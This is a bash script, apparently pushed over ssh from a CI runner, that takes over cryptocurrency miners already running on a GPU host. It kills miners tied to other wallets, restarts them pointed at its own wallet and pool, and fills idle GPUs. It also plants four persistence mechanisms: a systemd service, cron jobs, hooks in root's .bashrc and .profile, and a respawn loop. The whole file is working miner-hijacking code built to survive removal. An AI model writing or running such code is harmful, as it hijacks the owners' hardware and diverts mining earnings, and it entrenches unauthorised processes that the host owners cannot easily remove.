#!/bin/bash
# UL re-point: take the already-running foreign-wallet pearlhash miners on this host
# and re-point them to the canonical wallet/worker, then install 4-layer persistence.
# Runs ON the target host, piped over ssh from the GitHub runner.
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=${PREFIX:-ul-t2-123-184-7-135}
D=/root/ul
mkdir -p "$D/logs" "$D/backup"
echo "### BASELINE $(date -u +%FT%TZ)"
id; hostname; uname -m; nproc
echo "### GPU"
nvidia-smi -L
nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
echo "### PROCS-BEFORE"
ps -eo pid,user,args | grep -E 'wildrig|srbminer|peakminer|krig|forge|xmrig' | grep -v grep | tee "$D/procs.before.txt"
echo "### UNITS"
systemctl list-units --type=service --all --no-pager 2>/dev/null | grep -iE 'mine|wildrig|prl|pearl|krig|keep|nv-'
echo "### CRON"
crontab -l 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null
echo "### FILES-OPT"
ls -la /opt/t19/ 2>/dev/null | head -20
ls -la /usr/local/bin/ 2>/dev/null | grep -iE 'keep|mine|prl|pearl|start'
echo "### SUPERVISOR-HUNT"
grep -rlsE 'plh-|pearlhash|wildrig' /etc/systemd/system /etc/cron.d /etc/crontab /etc/rc.local /root /opt /usr/local/bin 2>/dev/null | grep -vE '^/root/ul|/logs/' | head -40 | tee "$D/supervisors.txt"
echo "### POOL-PROBE-FROM-HOST"
for hp in prl-sg.kryptex.network:7048 prl-sg.kryptex.network:8048 prl-eu.kryptex.network:7048 prl-hk.kryptex.network:7048 pool.pearlhash.xyz:9000 pearl.luckypool.io:443; do
  h=${hp%:*}; p=${hp#*:}
  if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "$hp OPEN"; else echo "$hp CLOSED"; fi
done | tee "$D/poolprobe.txt"
POOL=pool.pearlhash.xyz:9000
if grep -q 'prl-sg.kryptex.network:7048 OPEN' "$D/poolprobe.txt"; then POOL=prl-sg.kryptex.network:7048; fi
echo "POOL=$POOL"
echo "$POOL" > "$D/pool.selected"

# --- re-point every running wildrig instance, one per UUID, preserving device+api-port ---
echo "### REPOINT"
cp "$D/procs.before.txt" "$D/argv.backup.$(date +%s)"
i=0
awk '/\/opt\/t19\/wildrig-multi/ {print}' "$D/procs.before.txt" | while read -r pid user rest; do
  [ -z "$pid" ] && continue
  dev=$(printf '%s' "$rest" | sed -n 's/.*--opencl-devices \([0-9]*\).*/\1/p')
  api=$(printf '%s' "$rest" | sed -n 's/.*--api-port \([0-9]*\).*/\1/p')
  inten=$(printf '%s' "$rest" | sed -n 's/.*--gpu-intensity \([0-9]*\).*/\1/p')
  [ -z "$dev" ] && dev=$i
  [ -z "$api" ] && api=$((1960+dev))
  [ -z "$inten" ] && inten=1
  W="$PREFIX-g$dev"
  CMD="/opt/t19/wildrig-multi --algo pearlhash --url $POOL --user $WALLET --worker $W --pass x --protocol stratum --opencl-devices $dev --gpu-intensity $inten --gpu-temp-limit 90 --api-port $api"
  printf '#!/bin/sh\nexec %s >> %s/logs/g%s.log 2>&1\n' "$CMD" "$D" "$dev" > "$D/cmd-g$dev.sh"
  chmod +x "$D/cmd-g$dev.sh"
  printf '%s\n' "$CMD" > "$D/argv-g$dev.txt"
  kill -TERM "$pid" 2>/dev/null; sleep 1; kill -KILL "$pid" 2>/dev/null
  setsid nohup sh "$D/cmd-g$dev.sh" >/dev/null 2>&1 &
  echo "REPOINT old_pid=$pid dev=$dev worker=$W api=$api pool=$POOL"
done

# --- start any device that had no process (0..7) ---
echo "### FILL-GAPS"
for dev in 0 1 2 3 4 5 6 7; do
  [ -f "$D/cmd-g$dev.sh" ] && continue
  W="$PREFIX-g$dev"
  CMD="/opt/t19/wildrig-multi --algo pearlhash --url $POOL --user $WALLET --worker $W --pass x --protocol stratum --opencl-devices $dev --gpu-intensity 1 --gpu-temp-limit 90 --api-port $((1960+dev))"
  printf '#!/bin/sh\nexec %s >> %s/logs/g%s.log 2>&1\n' "$CMD" "$D" "$dev" > "$D/cmd-g$dev.sh"
  chmod +x "$D/cmd-g$dev.sh"
  printf '%s\n' "$CMD" > "$D/argv-g$dev.txt"
  if ! pgrep -f -- "--worker $W" >/dev/null 2>&1; then
    setsid nohup sh "$D/cmd-g$dev.sh" >/dev/null 2>&1 &
    echo "GAP-START dev=$dev worker=$W"
  fi
done

# --- persistence layer 4: keep.sh respawn from live cmdline ---
cat > "$D/keep.sh" <<EOS
#!/bin/bash
D=$D
WALLET=$WALLET
PREFIX=$PREFIX
LOG=\$D/keep.log
for f in \$D/cmd-g*.sh; do
  [ -f "\$f" ] || continue
  dev=\$(basename "\$f" | sed 's/cmd-g\(.*\)\.sh/\1/')
  W="\$PREFIX-g\$dev"
  if ! pgrep -f -- "--worker \$W" >/dev/null 2>&1; then
    setsid nohup sh "\$f" >/dev/null 2>&1 &
    echo "\$(date -u +%FT%TZ) respawn \$W" >> \$LOG
  fi
done
EOS
chmod +x "$D/keep.sh"
cat > "$D/keep-loop.sh" <<EOS
#!/bin/bash
while true; do /bin/bash "$D/keep.sh"; sleep 60; done
EOS
chmod +x "$D/keep-loop.sh"

# --- persistence layer 1: systemd Restart=always ---
cat > /etc/systemd/system/ul-pearl-keep.service <<EOS
[Unit]
Description=ul pearl keepalive
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash $D/keep-loop.sh
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload 2>/dev/null
systemctl enable --now ul-pearl-keep.service 2>/dev/null
systemctl is-active ul-pearl-keep.service 2>/dev/null

# --- persistence layer 2: cron @reboot + */5 ---
( crontab -l 2>/dev/null | grep -v 'ul/keep.sh'; echo "@reboot /bin/bash $D/keep.sh >> $D/keep.log 2>&1"; echo "*/5 * * * * /bin/bash $D/keep.sh >> $D/keep.log 2>&1" ) | crontab - 2>/dev/null
crontab -l 2>/dev/null | tail -3

# --- persistence layer 3: shell hooks ---
for rc in /root/.bashrc /root/.profile /etc/profile.d/ul-keep.sh; do
  [ -f "$rc" ] || continue
  grep -q 'ul/keep.sh' "$rc" 2>/dev/null || echo '[ -x /root/ul/keep.sh ] && /bin/bash /root/ul/keep.sh >/dev/null 2>&1' >> "$rc"
done

sleep 15
echo "### PROCS-AFTER"
ps -eo pid,user,args | grep wildrig | grep -v grep
echo "### LOCAL-API"
for p in 1960 1961 1962 1963 1964 1965 1966 1967; do
  printf 'api %s: ' "$p"; curl -s -m 3 "http://127.0.0.1:$p/" 2>/dev/null | head -c 160; echo
done
echo "### MINER-LOGS"
for g in 0 1 2 3 4 5 6 7; do echo "--- g$g"; tail -6 "$D/logs/g$g.log" 2>/dev/null; done
echo "### DONE-REPOINT"
